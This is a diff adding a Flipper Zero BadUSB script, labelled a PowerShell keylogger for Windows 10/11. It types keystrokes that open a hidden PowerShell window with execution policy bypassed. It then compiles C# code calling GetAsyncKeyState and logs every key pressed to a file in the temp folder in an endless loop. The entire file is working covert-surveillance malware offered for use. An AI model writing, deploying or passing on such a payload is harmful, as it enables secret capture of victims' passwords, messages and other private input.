@@ -1,0 +1,24 @@
+REM ========================================
+REM NullSec Flipper Zero BadUSB
+REM Payload: PowerShell Keylogger
+REM Target: Windows 10/11
+REM ========================================
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell -w hidden -ep bypass -c "$code = @'
+ENTER
+STRING Add-Type -TypeDefinition @"
+ENTER
+STRING using System; using System.Runtime.InteropServices;
+ENTER
+STRING public class KL { [DllImport(\"user32.dll\")] public static extern int GetAsyncKeyState(Int32 i); }
+ENTER
+STRING "@ -Language CSharp
+ENTER
+STRING $log = \"$env:TEMP\kl.txt\"; while($true){Start-Sleep -Milliseconds 40
+ENTER
+STRING for($i=8;$i -le 190;$i++){if([KL]::GetAsyncKeyState($i) -eq -32767){$k=[char]$i;$k|Out-File $log -Append}}}
+ENTER
+STRING '@ ; Invoke-Expression $code"
+ENTER
